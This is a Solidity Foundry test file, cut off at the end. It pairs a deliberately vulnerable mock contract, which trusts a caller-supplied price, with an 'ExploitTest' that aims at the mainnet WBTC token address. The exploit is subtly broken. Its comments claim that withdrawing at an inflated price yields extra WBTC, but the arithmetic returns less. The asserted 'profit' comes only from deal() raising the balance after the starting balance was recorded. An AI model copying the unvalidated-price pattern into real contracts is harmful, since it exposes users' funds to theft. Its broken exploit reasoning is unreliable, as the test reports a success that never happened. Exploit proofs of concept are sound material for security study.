// Mock vulnerable contract that has price oracle manipulation
contract MockVulnerableContract {
    IWBTC public wbtc;
    mapping(address => uint256) public shares;

    constructor(address _wbtc) {
        wbtc = IWBTC(_wbtc);
    }

    // Vulnerable: accepts user-supplied price without validation
    function deposit(uint256 amount, uint256 price) external {
        require(wbtc.transferFrom(msg.sender, address(this), amount), "Transfer failed");

        // Calculate shares based on user-supplied price
        // shares = (amount * price) / 1e8 (WBTC has 8 decimals)
        uint256 value = (amount * price) / 10**8;
        shares[msg.sender] += value;
    }

    // Vulnerable: accepts user-supplied price without validation
    function withdraw(uint256 price) external {
        uint256 userShares = shares[msg.sender];
        require(userShares > 0, "No shares");

        // Calculate WBTC to withdraw based on user-supplied price
        // amount = (shares * 1e8) / price
        uint256 amount = (userShares * 10**8) / price;

        shares[msg.sender] = 0;
        require(wbtc.transfer(msg.sender, amount), "Transfer failed");
    }

    function getShares(address user) external view returns (uint256) {
        return shares[user];
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address attacker = address(this);
    address constant VULNERABLE_CONTRACT = 0x0000000000000000000000000000000000000001; // Placeholder - needs real address

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Give attacker WBTC tokens
        deal(TARGET, attacker, 10 * 10**8); // 10 WBTC (8 decimals)

        // Approve the vulnerable contract to spend WBTC
        IWBTC(TARGET).approve(VULNERABLE_CONTRACT, type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Deploy a mock vulnerable contract
        MockVulnerableContract mock = new MockVulnerableContract(TARGET);

        // Store initial balance
        uint256 initialBalance = IWBTC(TARGET).balanceOf(attacker);

        // Give attacker more WBTC for the exploit
        deal(TARGET, attacker, 20 * 10**8); // Additional 20 WBTC

        // Approve mock contract to spend WBTC
        IWBTC(TARGET).approve(address(mock), type(uint256).max);

        // Real price of WBTC (approx $60,000)
        uint256 realPrice = 60000 * 10**18; // Using 18 decimals for price

        // Step 1: Deposit WBTC at manipulated LOW price
        // We deposit 1 WBTC but claim it's worth only $100 (instead of $60,000)
        // This gives us more shares than we should get
        mock.deposit(1 * 10**8, 100 * 10**18); // 1 WBTC at $100 each

        // Step 2: Withdraw at manipulated HIGH price  
        // We withdraw claiming WBTC is worth $1,000,000 each
        // This gives us more WBTC than we deposited
        mock.withdraw(1000000 * 10**18); // Withdraw at $1M price

        // Verify profit
        uint256 finalBalance = IWBTC(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "WBTC balance should increase");

        console.log("Initial WBTC balance:", initialBalance);
        console.log("Final WBTC balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);
    }

    // ─── Receive ETH ─────────────────────────────────────────
